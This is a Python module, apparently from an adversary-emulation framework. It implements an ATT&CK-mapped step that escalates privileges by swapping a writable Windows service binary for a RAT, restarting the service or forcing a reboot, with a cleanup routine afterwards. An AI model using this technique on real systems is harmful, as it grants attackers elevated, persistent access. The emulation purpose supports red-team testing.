import logging
import asyncio

from plugins.adversary.app.commands import cmd, sc
from plugins.adversary.app.operation.operation import Step, OPFile, OPHost, OPRat, OPVar, OPService
from plugins.adversary.app.commands.errors import *


log = logging.getLogger(__name__)


class ServiceManipulateFileScLocal(Step):
    """
    Description:
        This step hijacks a unprotected service on the target machine by swapping out the target binary with
        a copy of the RAT.
    Requirements:
        Requires a non-elevated RAT, and enumeration of a modifiable service binary on the target machine (possible
        result of running GetPrivEscSvcInfo).
    """
    attack_mapping = [('T1044', 'Privilege Escalation'), ('T1044', 'Persistence'), ('T1035', 'Execution'),
                      ('T1106', 'Execution')]
    display_name = "service_manipulation(sc file replace)"
    summary = "Abuse service file permissions to spawn an elevated rat by swapping out a service's binary"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                    "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'file',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]
    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True})),
                      ("service_g", OPService),
                      ("file_g", OPFile({"host": OPVar("host"),
                                         "src_host": OPVar("host")}))]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to swap binary of {} with our rat on {}".format(service.name, host.hostname)

    @staticmethod
    async def simulate(operation, rat, service, host, rat_g, service_g, file_g):
        return True

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g, file_g):
        try:
            # if the service is running, stop it first so we can modify the binary
            state = await operation.execute_shell_command(rat, *sc.query(service.name))
            if state['state'] == "RUNNING":
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
            # We need to move the real binary to a different name ( vuln.exe to vuln.exe.bak )
            await operation.execute_shell_command(rat, *cmd.move(service.modifiable_paths[0],
                                                                 service.modifiable_paths[0] + ".bak",
                                                                 suppress_overwrite=True))
            # save off that we moved the file to a new name
            await file_g({'path': service.modifiable_paths[0] + ".bak",
                          'src_path': service.modifiable_paths[0],
                          'use_case': "modified"})
            # Then we need to place a copy of our rat as the vulnerable name
            await operation.execute_shell_command(rat, *cmd.copy(rat.executable, service.modifiable_paths[0]))
            # save off that we put a new file (our rat) on disk
            await file_g({'path': service.modifiable_paths[0],
                          'src_path': rat.executable,
                          'use_case': 'rat'})
            # Lastly, we need a way to restart the service to get our binary to be executed
            if service.can_restart:
                await operation.execute_shell_command(rat, *sc.start(service.name))
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
            await rat_g()

        except (AccessDeniedError, NoFileError, FileInUseError):  # all possible bad errors should be caught here
            # something went wrong and we can't actually swap out the binary due to acls or can't stop the service
            await service_g({'name': service.name,
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': "echo \"Not Vulnerable\""})
            return False
        return True

    @staticmethod
    async def cleanup(cleaner, host, service, file_g):
        # stop the service so we can remove the files
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}, so can't delete {}".format(service.name,
                                                                       service.host,
                                                                       file_g[0].path))
        for file in file_g:
            if file['use_case'] == 'rat':
                await cleaner.delete(file)  # delete the rat file
        for file in file_g:
            if file['use_case'] == 'modified':
                # fix the original binary that we modified by creating the command we want to execute
                # await cleaner.run_on_agent(host, *cmd.move(file['path'], file['src_path'], True))
                # TODO: Fix the way the planner handles src_path and src_host fields in files!!
                # The following is just a temporary hack to fix
                await cleaner.run_on_agent(host, *cmd.move(file['path'], file['path'][:-4], True))
